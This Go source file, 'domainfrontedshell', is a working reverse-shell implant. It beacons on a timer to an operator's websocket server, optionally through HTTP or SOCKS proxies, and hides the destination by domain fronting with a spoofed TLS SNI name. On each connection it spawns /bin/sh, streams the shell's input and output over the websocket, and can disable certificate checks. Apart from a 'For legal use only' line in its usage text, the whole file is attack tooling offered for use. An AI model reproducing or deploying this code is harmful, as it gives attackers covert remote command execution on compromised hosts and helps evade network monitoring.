// domainfrontedshell is a shell over websockets through a proxy with domain
// fronting
package main

/*
 * domainfrontedshell
 * Shell via proxy, websockets, and domain fronting
 * By J. Stuart McMurray
 * Created 20170821
 * Last Modified 20170821
 */

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/magisterquis/connectproxy"
	"golang.org/x/net/proxy"
)

// BUFLEN is the stdout/err read buffer size
const BUFLEN = 1000 /* Should fit nicely in one frame */

// PINGINT is the interval at which pings are sent on websocket connections
const PINGINT = time.Minute

func main() {
	var (
		wsServer = flag.String(
			"server",
			"",
			"Websockets server `URL`",
		)
		name = flag.String(
			"domain",
			"",
			"Optional websockets server TLS SNI `name`",
		)
		pServer = flag.String(
			"proxy",
			"",
			"Optional proxy server `URL`",
		)
		pName = flag.String(
			"proxy-domain",
			"",
			"Optional proxy server TLS SNI `name`",
		)
		bInt = flag.Duration(
			"beacon",
			time.Hour,
			"Beacon `interval`",
		)
		isv = flag.Bool(
			"insecure",
			false,
			"Skip TLS certificate checks",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

Connects to the websockets server (-server) via a TLS connection to the
specified domain (-domain), optionally through a proxy (-proxy), connects it to
a shell.

The supported proxy types are:
- http and https (using the CONNECT verb)
- socks5

For legal use only.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Make sure we have necessary bits */
	if "" == *wsServer {
		log.Fatalf("Missing websocket server URL (-server)")
	}

	/* Register HTTP(s) proxy schemes */
	proxy.RegisterDialerType("http", connectproxy.New)
	proxy.RegisterDialerType("https", connectproxy.GeneratorWithConfig(
		&connectproxy.Config{
			InsecureSkipVerify: *isv,
			ServerName:         *pName,
		},
	))

	/* Set the proxy, if we have one */
	var d proxy.Dialer = proxy.Direct
	if "" != *pServer {
		/* Parse proxy URL */
		u, err := url.Parse(*pServer)
		if nil != err {
			log.Fatalf(
				"Unable to parse proxy server URL %q: %v",
				*pServer,
				err,
			)
		}
		/* Get dialer */
		d, err = proxy.FromURL(u, proxy.Direct)
		if nil != err {
			log.Fatalf(
				"Unable to determine proxy from %q: %v",
				u,
				err,
			)
		}
		log.Printf("Proxy: %v", u)
	}

	/* Beacon */
	num := 0 /* Tag number */
	for {
		go beacon(num, *wsServer, *name, d, *isv)
		num++
		time.Sleep(*bInt)
	}
}

/* beacon makes a websocket connection to wsurl, optionally via domain fronting
to the name dfname, via the dialer d.  On connection, a shell is spawned and
its stdio connected to the websocket. If isv is true and the connection to the
websocket server is via TLS, no certification validation will be performed. */
func beacon(num int, wsurl string, dfname string, d proxy.Dialer, isv bool) {
	/* Connect to websockets server */
	c, res, err := (&websocket.Dialer{
		NetDial: d.Dial,
		TLSClientConfig: &tls.Config{
			ServerName:         dfname,
			InsecureSkipVerify: isv,
		},
		EnableCompression: true,
	}).Dial(wsurl, nil)
	if nil != err {
		if nil != res {
			log.Printf(
				"[%v] Connection error to %q (%v): %v",
				num,
				wsurl,
				res.Status,
				err,
			)
		} else {
			log.Printf(
				"[%v] Connection error to %q: %v",
				num,
				wsurl,
				err,
			)
		}

		return
	}
	log.Printf("[%v] Connected: %v->%v", num, c.LocalAddr(), c.RemoteAddr())
	defer c.Close()

	/* Mutex to prevent multiple writes */
	writeLock := &sync.Mutex{}

	/* Prepare a shell */
	shell := exec.Command("/bin/sh")
	stdin, err := shell.StdinPipe()
	if nil != err {
		log.Printf("[%v] Unable to get shell stdin: %v", num, err)
		return
	}
	stdout, err := shell.StdoutPipe()
	if nil != err {
		log.Printf("[%v] Unablet oget shell stdout: %v", num, err)
		return
	}
	stderr, err := shell.StderrPipe()
	if nil != err {
		log.Printf("[%v] Unable to get shell stderr: %v", num, err)
		return
	}

	/* Start proxying comms */
	wg := &sync.WaitGroup{}
	wg.Add(3)
	go proxyInput(num, stdin, c, wg)
	go proxyOutput(num, "Stdout", c, stdout, writeLock, wg)
	go proxyOutput(num, "Stderr", c, stderr, writeLock, wg)

	/* Ping every so often */
	done := make(chan struct{})
	defer func() { close(done) }()
	go pinger(num, c, writeLock, done)

	/* Fire off the shell */
	if err := shell.Run(); nil != err {
		log.Printf("[%v] Shell exit error: %v", num, err)
	}

	wg.Wait()
	log.Printf("[%v] Done.", num)
}

/* proxyInput copies from ws to in until an error occurs. */
func proxyInput(
	num int,
	in io.WriteCloser,
	ws *websocket.Conn,
	wg *sync.WaitGroup,
) {
	defer wg.Done()
	defer in.Close()
	defer ws.Close()
	for {
		/* Get a message */
		t, msg, err := ws.ReadMessage()
		if nil != err {
			printErr(num, err, "Stdin read")
			return
		}
		/* For some reason, newlines are stripped */
		if websocket.TextMessage == t {
			if runtime.GOOS == "windows" {
				msg = append(msg, '\r')
			}
			msg = append(msg, '\n')
		}
		/* Write it to the shell */
		if _, err := in.Write(msg); nil != err {
			printErr(num, err, "Stdin write")
			return
		}
	}
}

/* proxyOutput copies from out to ws until an error occurs.  During writes, l
will be held.  Name should either be Stdout or Stderr. */
func proxyOutput(
	num int,
	name string,
	ws *websocket.Conn,
	out io.ReadCloser,
	l *sync.Mutex,
	wg *sync.WaitGroup,
) {
	defer wg.Done()
	defer out.Close()
	defer ws.Close()
	var (
		buf = make([]byte, BUFLEN)
		n   int
		err error
	)
	for {
		/* Get some output */
		n, err = out.Read(buf)
		if nil != err {
			if io.EOF == err {
				return
			}
			printErr(num, err, "%v read", name)
			return
		}
		/* Strip trailing newlines, because websockets... */
		for {
			if '\n' == buf[n-1] ||
				(runtime.GOOS == "windows" &&
					'\r' == buf[n-1]) {
				n--
				continue
			}
			break
		}
		/* Hold the lock, send it */
		l.Lock()
		err = ws.WriteMessage(websocket.BinaryMessage, buf[:n])
		l.Unlock()
		if nil != err {
			if io.EOF == err {
				return
			}
			printErr(num, err, "%v write", name)
			return
		}
	}
}

/* pinger sends pings to the connection every so often, holding l while it
does.  It terminates when done is closed or a write fails. */
func pinger(
	num int,
	ws *websocket.Conn,
	l *sync.Mutex,
	done <-chan struct{},
) {
	defer ws.Close()

	/* Canned ping */
	pm, err := websocket.NewPreparedMessage(websocket.PingMessage, []byte{})
	if nil != err {
		log.Printf("[%v] Unable to prepare ping message: %v", num, err)
		return
	}
	for {
		/* Try to send the ping */
		l.Lock()
		err = ws.WritePreparedMessage(pm)
		l.Unlock()
		if nil != err {
			printErr(num, err, "Unable to ping")
			return
		}
		/* Wait or exit */
		select {
		case <-time.After(PINGINT):
		case <-done:
			return
		}
	}
}

/* printErr prints the number in square brackets, the message, its arguments,
and the error, all assuming the error isn't boring.  This currently means EOF
and closed network connections. */
func printErr(num int, err error, f string, a ...interface{}) {
	/* Don't print boring canned errors */
	switch err {
	case io.EOF:
		return
	}
	/* Don't print errors with specific suffixes */
	for _, s := range []string{"use of closed network connection"} {
		if strings.HasSuffix(err.Error(), s) {
			return
		}
	}
	/* Ok, message is interesting, print it */
	log.Printf("[%v] %s: %s", num, fmt.Sprintf(f, a...), err)
}
